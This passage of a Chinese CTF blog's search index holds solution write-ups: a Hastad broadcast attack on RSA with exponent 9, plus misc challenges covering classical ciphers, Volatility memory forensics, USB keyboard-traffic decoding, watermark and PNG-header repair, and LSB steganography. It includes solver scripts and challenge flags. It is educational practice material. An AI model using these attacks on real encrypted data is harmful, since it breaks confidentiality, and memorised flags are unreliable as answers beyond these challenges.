85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198,         14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656,         1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839,         2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981,         16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376,         31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996,         25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515]</code></pre><p>上述题目代码主要是为了生成九组n和c</p><p>解题代码：</p><pre><code class="python">import binascii,gmpy2from functools import reducefrom Crypto.Util.number import *import libnumdef CRT(ni, ci):    assert(reduce(gmpy2.gcd, ni) == 1)    assert (isinstance(ni, list) and isinstance(ci, list))    N = reduce(lambda x, y: x * y, ni) # ni的乘积 N = n1*n2*n3.....    ai_ti_Mi = [a * (N // m) * gmpy2.invert(N // m, m) for (m, a) in zip(ni, ci)]    return reduce(lambda x, y: x + y, ai_ti_Mi) % Ne = 9  # 题目给出的低指数en_list = [71189786319102608575263218254922479901008514616376166401353025325668690465852130559783959409002115897148828732231478529655075366072137059589917001875303598680931962384468363842379833044123189276199264340224973914079447846845897807085694711541719515881377391200011269924562049643835131619086349617062034608799,         92503831027754984321994282254005318198418454777812045042619263533423066848097985191386666241913483806726751133691867010696758828674382946375162423033994046273252417389169779506788545647848951018539441971140081528915876529645525880324658212147388232683347292192795975558548712504744297104487514691170935149949,         100993952830138414466948640139083231443558390127247779484027818354177479632421980458019929149817002579508423291678953554090956334137167905685261724759487245658147039684536216616744746196651390112540237050493468689520465897258378216693418610879245129435268327315158194612110422630337395790254881602124839071919,         59138293747457431012165762343997972673625934330232909935732464725128776212729547237438509546925172847581735769773563840639187946741161318153031173864953372796950422229629824699580131369991913883136821374596762214064774480548532035315344368010507644630655604478651898097886873485265848973185431559958627423847,         66827868958054485359731420968595906328820823695638132426084478524423658597714990545142120448668257273436546456116147999073797943388584861050133103137697812149742551913704341990467090049650721713913812069904136198912314243175309387952328961054617877059134151915723594900209641163321839502908705301293546584147,         120940513339890268554625391482989102665030083707530690312336379356969219966820079510946652021721814016286307318930536030308296265425674637215009052078834615196224917417698019787514831973471113022781129000531459800329018133248426080717653298100515701379374786486337920294380753805825328119757649844054966712377,         72186594495190221129349814154999705524005203343018940547856004977368023856950836974465616291478257156860734574686154136925776069045232149725101769594505766718123155028300703627531567850035682448632166309129911061492630709698934310123778699316856399909549674138453085885820110724923723830686564968967391721281,         69105037583161467265649176715175579387938714721653281201847973223975467813529036844308693237404592381480367515044829190066606146105800243199497182114398931410844901178842049915914390117503986044951461783780327749665912369177733246873697481544777183820939967036346862056795919812693669387731294595126647751951,         76194219445824867986050004226602973283400885106636660263597964027139613163638212828932901192009131346530898961165310615466747046710743013409318156266326090650584190382130795884514074647833949281109675170830565650006906028402714868781834693473191228256626654011772428115359653448111208831188721505467497494581]c_list = [62580922178008480377006528793506649089253164524883696044759651305970802215270721223149734532870729533611357047595181907404222690394917605617029675103788705320032707977225447998111744887898039756375876685711148857676502670812333076878964148863713993853526715855758799502735753454247721711366497722251078739585,         46186240819076690248235492196228128599822002268014359444368898414937734806009161030424589993541799877081745454934484263188270879142125136786221625234555265815513136730416539407710862948861531339065039071959576035606192732936477944770308784472646015244527805057990939765708793705044236665364664490419874206900,         85756449024868529058704599481168414715291172247059370174556127800630896693021701121075838517372920466708826412897794900729896389468152213884232173410022054605870785910461728567377769960823103334874807744107855490558726013068890632637193410610478514663078901021307258078678427928255699031215654693270240640198,         14388767329946097216670270960679686032536707277732968784379505904021622612991917314721678940833050736745004078559116326396233622519356703639737886289595860359630019239654690312132039876082685046329079266785042428947147658321799501605837784127004536996628492065409017175037161261039765340032473048737319069656,         1143736792108232890306863524988028098730927600066491485326214420279375304665896453544100447027809433141790331191324806205845009336228331138326163746853197990596700523328423791764843694671580875538251166864957646807184041817863314204516355683663859246677105132100377322669627893863885482167305919925159944839,         2978800921927631161807562509445310353414810029862911925227583943849942080514132963605492727604495513988707849133045851539412276254555228149742924149242124724864770049898278052042163392380895275970574317984638058768854065506927848951716677514095183559625442889028813635385408810698294574175092159389388091981,         16200944263352278316040095503540249310705602580329203494665614035841657418101517016718103326928336623132935178377208651067093136976383774189554806135146237406248538919915426183225265103769259990252162411307338473817114996409705345401251435268136647166395894099897737607312110866874944619080871831772376466376,         31551601425575677138046998360378916515711528548963089502535903329268089950335615563205720969393649713416910860593823506545030969355111753902391336139384464585775439245735448030993755229554555004154084649002801255396359097917380427525820249562148313977941413268787799534165652742114031759562268691233834820996,         25288164985739570635307839193110091356864302148147148153228604718807817833935053919412276187989509493755136905193728864674684139319708358686431424793278248263545370628718355096523088238513079652226028236137381367215156975121794485995030822902933639803569133458328681148758392333073624280222354763268512333515]m = gmpy2.iroot(CRT(n_list, c_list), e)[0]print(m)print(libnum.n2s(int(m)))</code></pre><p>b’flag{H0w_Fun_13_HAstads_broadca5t_AtTack!}\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16’</p><p>得到结果：flag{H0w_Fun_13_HAstads_broadca5t_AtTack!}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些misc和crypto刷题(nssctf)</title>
      <link href="/2023/03/07/wp/"/>
      <url>/2023/03/07/wp/</url>
      
        <content type="html"><![CDATA[<h1 id="misc-Spectre"><a href="#misc-Spectre" class="headerlink" title="misc Spectre"></a>misc Spectre</h1><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230307225413839.png" alt="image-20230307225413839"></p><p>将音频放进audacity 一下出</p><p>:horse:<em>utflag</em>{sp3tr0gr4m0ph0n3}</p><h1 id="crypto-SWPUCTF-2022-新生赛-什锦"><a href="#crypto-SWPUCTF-2022-新生赛-什锦" class="headerlink" title="crypto [SWPUCTF 2022 新生赛]什锦"></a>crypto [SWPUCTF 2022 新生赛]什锦</h1><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308082911348.png" alt="image-20230308082911348"></p><p>一眼猪圈密码 找个在线解密解一下</p><p><a href="http://www.hiencode.com/pigpen.html">http://www.hiencode.com/pigpen.html</a></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308083225095.png" alt="image-20230308083225095"></p><p>明文：pigissocutewhyyoukillpig</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308083321053.png" alt="image-20230308083321053"></p><p>密码A是社会主义核心价值观密码</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308083529386.png" alt="image-20230308083529386"></p><p>明文：富强明主文明和谐</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308085826166.png" alt="image-20230308085826166"></p><p>密码c放进随波逐流跑一下</p><p>明文：但是猪猪好好吃诶</p><p>之前没有见过这个Brainfuck密码 搜了一下 和c语言的一些操作有关 算是一种古典密码吧</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308090454277.png" alt="image-20230308090454277"></p><p>组合起来就是 富强明主和谐pigissocutewhyyoukillpig但是猪猪好好吃诶</p><p>flag&#x3D;MD5{ 富强明主和谐pigissocutewhyyoukillpig但是猪猪好好吃诶}</p><p>即:horse:<em>flag</em>{5fcaf5cb66da56d692f2d6821d450ee4}</p><h1 id="OtterCTF-2018-General-Info"><a href="#OtterCTF-2018-General-Info" class="headerlink" title="[OtterCTF 2018]General Info"></a>[OtterCTF 2018]General Info</h1><p>对注册表进行内存取证 先获得注册表的profile信息 为：Win7SP1x64</p><p>E:\VolatilityWorkbench-内存取证\volatility.exe -f E:\Desktop\OtterCTF\OtterCTF.vmem imageinfo</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308160323081.png" alt="image-20230308160323081"></p><p>然后得到注册表的ip地址:192.168.202.131</p><p>![image-20230308150953721](E:\Desktop\image-20230308150953721.png</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308160516098.png" alt="image-20230308160516098"></p><p>最后得到pc name ： WIN-LO6FAF3DTFE</p><p>E:\VolatilityWorkbench-内存取证\volatility.exe -f E:\Desktop\OtterCTF\OtterCTF.vmem –profile&#x3D;Win7SP1x64 printkey -K “ControlSet001\Control\ComputerName\ComputerName”</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308160629726.png" alt="image-20230308160629726"></p><p>综上，flag为:horse:<em>NSSCTF</em>{WIN-LO6FAF3DTFE-192.168.202.131}</p><h1 id="CISCN-2022-初赛-ez-usb"><a href="#CISCN-2022-初赛-ez-usb" class="headerlink" title="[CISCN 2022 初赛]ez_usb"></a>[CISCN 2022 初赛]ez_usb</h1><p>题目给了提示是键盘协议，键盘数据包的数据长度为8个字节，击键信息集中在第3个字节。所以我们在winshark里面要搜索8个字节长度的数据包 其中2.8.1和2.10.1的数据包字节长度是8个字节 说明键盘给这两个地方键入了值</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308222917791.png" alt="image-20230308222917791"></p><p>接着 我们可以对这两个source分别进行提取</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308223414602.png" alt="image-20230308223414602"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308223452821.png" alt="image-20230308223452821"></p><p>从这两个包里面提取出其中的键盘流量 可以在kali里面实现</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308224337281.png" alt="image-20230308224337281"></p><p>然后找个脚本还原数据</p><pre><code class="python">f_data = input(&quot;请输入带处理txt文件的路径：&quot;)shujian = int(input(&quot;鼠标流量信息请输入8，键盘流量请输入16：&quot;))f = open(f_data, &#39;r&#39;)# 整理到out.txtwith open(&#39;out1.txt&#39;, &#39;w&#39;) as f_out:    for i in f.readlines():        s = i.strip()        # 鼠标流量长度为8 ，键盘流量长度为16        if len(s) == shujian:            # 鼠标流量长度为8 ，键盘流量长度为16            nsl = [s[j:j + 2] for j in range(0, shujian, 2)]            ns = &quot;:&quot;.join(nsl)            f_out.write(ns)            f_out.write(&#39;\n&#39;)</code></pre><p>这个脚本是处理刚刚分离出来的10data.txt和8data.txt文件中的冒号和空格的 将处理后的文件分别以out.txt和out1.txt输出</p><pre><code class="python">normalKeys = &#123;&quot;04&quot;: &quot;a&quot;, &quot;05&quot;: &quot;b&quot;, &quot;06&quot;: &quot;c&quot;, &quot;07&quot;: &quot;d&quot;, &quot;08&quot;: &quot;e&quot;, &quot;09&quot;: &quot;f&quot;, &quot;0a&quot;: &quot;g&quot;, &quot;0b&quot;: &quot;h&quot;, &quot;0c&quot;: &quot;i&quot;,              &quot;0d&quot;: &quot;j&quot;, &quot;0e&quot;: &quot;k&quot;, &quot;0f&quot;: &quot;l&quot;, &quot;10&quot;: &quot;m&quot;, &quot;11&quot;: &quot;n&quot;, &quot;12&quot;: &quot;o&quot;, &quot;13&quot;: &quot;p&quot;, &quot;14&quot;: &quot;q&quot;, &quot;15&quot;: &quot;r&quot;,              &quot;16&quot;: &quot;s&quot;, &quot;17&quot;: &quot;t&quot;, &quot;18&quot;: &quot;u&quot;, &quot;19&quot;: &quot;v&quot;, &quot;1a&quot;: &quot;w&quot;, &quot;1b&quot;: &quot;x&quot;, &quot;1c&quot;: &quot;y&quot;, &quot;1d&quot;: &quot;z&quot;, &quot;1e&quot;: &quot;1&quot;,              &quot;1f&quot;: &quot;2&quot;, &quot;20&quot;: &quot;3&quot;, &quot;21&quot;: &quot;4&quot;, &quot;22&quot;: &quot;5&quot;, &quot;23&quot;: &quot;6&quot;, &quot;24&quot;: &quot;7&quot;, &quot;25&quot;: &quot;8&quot;, &quot;26&quot;: &quot;9&quot;, &quot;27&quot;: &quot;0&quot;,              &quot;28&quot;: &quot;&lt;RET&gt;&quot;, &quot;29&quot;: &quot;&lt;ESC&gt;&quot;, &quot;2a&quot;: &quot;&lt;DEL&gt;&quot;, &quot;2b&quot;: &quot;\t&quot;, &quot;2c&quot;: &quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;: &quot;-&quot;, &quot;2e&quot;: &quot;=&quot;, &quot;2f&quot;: &quot;[&quot;,              &quot;30&quot;: &quot;]&quot;, &quot;31&quot;: &quot;\\&quot;, &quot;32&quot;: &quot;&lt;NON&gt;&quot;, &quot;33&quot;: &quot;;&quot;, &quot;34&quot;: &quot;&#39;&quot;, &quot;35&quot;: &quot;&lt;GA&gt;&quot;, &quot;36&quot;: &quot;,&quot;, &quot;37&quot;: &quot;.&quot;, &quot;38&quot;: &quot;/&quot;,              &quot;39&quot;: &quot;&lt;CAP&gt;&quot;, &quot;3a&quot;: &quot;&lt;F1&gt;&quot;, &quot;3b&quot;: &quot;&lt;F2&gt;&quot;, &quot;3c&quot;: &quot;&lt;F3&gt;&quot;, &quot;3d&quot;: &quot;&lt;F4&gt;&quot;, &quot;3e&quot;: &quot;&lt;F5&gt;&quot;, &quot;3f&quot;: &quot;&lt;F6&gt;&quot;,              &quot;40&quot;: &quot;&lt;F7&gt;&quot;, &quot;41&quot;: &quot;&lt;F8&gt;&quot;, &quot;42&quot;: &quot;&lt;F9&gt;&quot;, &quot;43&quot;: &quot;&lt;F10&gt;&quot;, &quot;44&quot;: &quot;&lt;F11&gt;&quot;, &quot;45&quot;: &quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123;&quot;04&quot;: &quot;A&quot;, &quot;05&quot;: &quot;B&quot;, &quot;06&quot;: &quot;C&quot;, &quot;07&quot;: &quot;D&quot;, &quot;08&quot;: &quot;E&quot;, &quot;09&quot;: &quot;F&quot;, &quot;0a&quot;: &quot;G&quot;, &quot;0b&quot;: &quot;H&quot;, &quot;0c&quot;: &quot;I&quot;,             &quot;0d&quot;: &quot;J&quot;, &quot;0e&quot;: &quot;K&quot;, &quot;0f&quot;: &quot;L&quot;, &quot;10&quot;: &quot;M&quot;, &quot;11&quot;: &quot;N&quot;, &quot;12&quot;: &quot;O&quot;, &quot;13&quot;: &quot;P&quot;, &quot;14&quot;: &quot;Q&quot;, &quot;15&quot;: &quot;R&quot;,             &quot;16&quot;: &quot;S&quot;, &quot;17&quot;: &quot;T&quot;, &quot;18&quot;: &quot;U&quot;, &quot;19&quot;: &quot;V&quot;, &quot;1a&quot;: &quot;W&quot;, &quot;1b&quot;: &quot;X&quot;, &quot;1c&quot;: &quot;Y&quot;, &quot;1d&quot;: &quot;Z&quot;, &quot;1e&quot;: &quot;!&quot;,             &quot;1f&quot;: &quot;@&quot;, &quot;20&quot;: &quot;#&quot;, &quot;21&quot;: &quot;$&quot;, &quot;22&quot;: &quot;%&quot;, &quot;23&quot;: &quot;^&quot;, &quot;24&quot;: &quot;&amp;&quot;, &quot;25&quot;: &quot;*&quot;, &quot;26&quot;: &quot;(&quot;, &quot;27&quot;: &quot;)&quot;,             &quot;28&quot;: &quot;&lt;RET&gt;&quot;, &quot;29&quot;: &quot;&lt;ESC&gt;&quot;, &quot;2a&quot;: &quot;&lt;DEL&gt;&quot;, &quot;2b&quot;: &quot;\t&quot;, &quot;2c&quot;: &quot;&lt;SPACE&gt;&quot;, &quot;2d&quot;: &quot;_&quot;, &quot;2e&quot;: &quot;+&quot;, &quot;2f&quot;: &quot;&#123;&quot;,             &quot;30&quot;: &quot;&#125;&quot;, &quot;31&quot;: &quot;|&quot;, &quot;32&quot;: &quot;&lt;NON&gt;&quot;, &quot;33&quot;: &quot;\&quot;&quot;, &quot;34&quot;: &quot;:&quot;, &quot;35&quot;: &quot;&lt;GA&gt;&quot;, &quot;36&quot;: &quot;&lt;&quot;, &quot;37&quot;: &quot;&gt;&quot;, &quot;38&quot;: &quot;?&quot;,             &quot;39&quot;: &quot;&lt;CAP&gt;&quot;, &quot;3a&quot;: &quot;&lt;F1&gt;&quot;, &quot;3b&quot;: &quot;&lt;F2&gt;&quot;, &quot;3c&quot;: &quot;&lt;F3&gt;&quot;, &quot;3d&quot;: &quot;&lt;F4&gt;&quot;, &quot;3e&quot;: &quot;&lt;F5&gt;&quot;, &quot;3f&quot;: &quot;&lt;F6&gt;&quot;,             &quot;40&quot;: &quot;&lt;F7&gt;&quot;, &quot;41&quot;: &quot;&lt;F8&gt;&quot;, &quot;42&quot;: &quot;&lt;F9&gt;&quot;, &quot;43&quot;: &quot;&lt;F10&gt;&quot;, &quot;44&quot;: &quot;&lt;F11&gt;&quot;, &quot;45&quot;: &quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#39;out1.txt&#39;)  # 这里是加号冒号的数据for line in keys:    try:        if line[0] != &#39;0&#39; or (line[1] != &#39;0&#39; and line[1] != &#39;2&#39;) or line[3] != &#39;0&#39; or line[4] != &#39;0&#39; or line[            9] != &#39;0&#39; or line[10] != &#39;0&#39; or line[12] != &#39;0&#39; or line[13] != &#39;0&#39; or line[15] != &#39;0&#39; or line[16] != &#39;0&#39; or \                line[18] != &#39;0&#39; or line[19] != &#39;0&#39; or line[21] != &#39;0&#39; or line[22] != &#39;0&#39; or line[6:8] == &quot;00&quot;:            continue        if line[6:8] in normalKeys.keys():            output += [[normalKeys[line[6:8]]], [shiftKeys[line[6:8]]]][line[1] == &#39;2&#39;]        else:            output += [&#39;[unknown]&#39;]    except:        passkeys.close()flag = 0print(&quot;&quot;.join(output))for i in range(len(output)):    try:        a = output.index(&#39;&lt;DEL&gt;&#39;)        del output[a]        del output[a - 1]    except:        passfor i in range(len(output)):    try:        if output[i] == &quot;&lt;CAP&gt;&quot;:            flag += 1            output.pop(i)            if flag == 2:                flag = 0        if flag != 0:            output[i] = output[i].upper()    except:        passprint(&#39;output :&#39; + &quot;&quot;.join(output))</code></pre><p>该脚本就是正式转换流量包中的数据</p><p>在out1.txt中得到的数据是：</p><p>526172211a0700Cf907300000d00000000000000c4527424943500300000002A00000002b9f9b0530778b5541d33080020000000666c61672E747874B9Ba013242f3aFC000b092c229d6e994167c05A78708b271fFC042ae3d251e65536F9Ada87c77406b67d0E6316684766a86e844dC81AA2c72c71348d10c43D7B00400700</p><p>放在010editor中 显示是一个rar压缩包</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308231758718.png" alt="image-20230308231758718"></p><p>在out.txt中得到的数据是：35c535765e50074a</p><p>发现这个数据就是刚刚压缩包的密码 打开即得flag</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230308231915761.png" alt="image-20230308231915761"></p><p>flag{20de17cc-d2c1-4b61-bebd-41159ed7172d}</p><h1 id="鹏城杯-2022-Misc-water"><a href="#鹏城杯-2022-Misc-water" class="headerlink" title="[鹏城杯 2022]Misc_water"></a>[鹏城杯 2022]Misc_water</h1><p>打开是一个有密码的压缩包和一张图片 打开图片发现首尾藏了两张图片</p><p>将首尾两张图片分离出来</p><p><img src="E:\Desktop\时间线招新nss刷题\Misc_water\Misc_water\Untitled1.png" alt="Untitled1"></p><p><img src="E:\Desktop\时间线招新nss刷题\Misc_water\Misc_water\Untitled2.png" alt="Untitled2"></p><p>通过观察 发现剩余的十六进制数据是一个倒序的jpg文件 使用脚本可以将图片倒序从而获得完好的图片</p><pre><code class="python">with open(&#39;1.jpg&#39;, &#39;rb&#39;) as f:    with open(&#39;2.jpg&#39;, &#39;wb&#39;) as g:        g.write(f.read()[::-1])</code></pre><p><img src="E:\pythonProject\2.jpg" alt="2"></p><p>题目提示是盲水印 使用隐性水印工具提取水印</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230310213125549.png" alt="image-20230310213125549"></p><p>发现密码是：ZC4#QaWbW</p><p>压缩包打开是一张图片 提示是png宽高修复</p><p>用脚本对其crc值进行校验修改</p><pre><code class="python">import zlibimport structimport argparseimport itertoolsparser = argparse.ArgumentParser()parser.add_argument(&quot;-f&quot;, type=str, default=None, required=True,                    help=&quot;flag.jpg&quot;)args = parser.parse_args()bin_data = open(args.f, &#39;rb&#39;).read()crc32key = zlib.crc32(bin_data[12:29]) # 计算crcoriginal_crc32 = int(bin_data[29:33].hex(), 16) # 原始crcif crc32key == original_crc32: # 计算crc对比原始crc    print(&#39;宽高没有问题!&#39;)else:    input_ = input(&quot;宽高被改了, 是否CRC爆破宽高? (Y/n):&quot;)    if input_ not in [&quot;Y&quot;, &quot;y&quot;, &quot;&quot;]:        exit()    else:        for i, j in itertools.product(range(4095), range(4095)): # 理论上0x FF FF FF FF，但考虑到屏幕实际/cpu，0x 0F FF就差不多了，也就是4095宽度和高度            data = bin_data[12:16] + struct.pack(&#39;&gt;i&#39;, i) + struct.pack(&#39;&gt;i&#39;, j) + bin_data[24:29]            crc32 = zlib.crc32(data)            if(crc32 == original_crc32): # 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定                print(f&quot;\nCRC32: &#123;hex(original_crc32)&#125;&quot;)                print(f&quot;宽度: &#123;i&#125;, hex: &#123;hex(i)&#125;&quot;)                print(f&quot;高度: &#123;j&#125;, hex: &#123;hex(j)&#125;&quot;)                exit(0)</code></pre><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230310221323869.png" alt="image-20230310221323869"></p><p>对其高宽进行修改 之后得到flag</p><p><img src="E:\pythonProject\flag.jpg" alt="flag"></p><p>flag{f0b31d6f9abc59f34815678c31d79178}</p><h1 id="CISCN-2022-初赛-everlasting-night"><a href="#CISCN-2022-初赛-everlasting-night" class="headerlink" title="[CISCN 2022 初赛]everlasting_night"></a>[CISCN 2022 初赛]everlasting_night</h1><p>题目提示是lsb 放在stegsolve中看一下 有一个小细节 是在Alpha2区域藏东西了 </p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230311161455320.png" alt="image-20230311161455320"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230311160223725.png" alt="image-20230311160223725"></p><p>发现了一个字符串 f78dcd 383f1b57346</p><p>放在kali里面用lsb.py跑一下 将得到的数据放在flag.txt中</p><p>拿出来放在010editor中 发现是个rar压缩包（有密码）</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230311162347351.png" alt="image-20230311162347351"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230311160547816.png" alt="image-20230311160547816"></p><p>题目中提示md5 打开初始的png图片 观察发现 结尾和普通的png图片好像有点不一样 多了一行数据</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230311160651988.png" alt="image-20230311160651988"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230311160717992.png" alt="image-20230311160717992"></p><p>拿出来md5解密一下：ohhWh04m1</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230311160937901.png" alt="image-20230311160937901"></p><p>这就是压缩包的解压密码</p><p>打开是一个损坏的png图片 使用kali中的gimp工具 先改名为flag.data</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230311161757993.png" alt="image-20230311161757993"></p><p>得出:horse:flag{607f41da-e849-4c0b-8867-1b3c74536cc4}</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
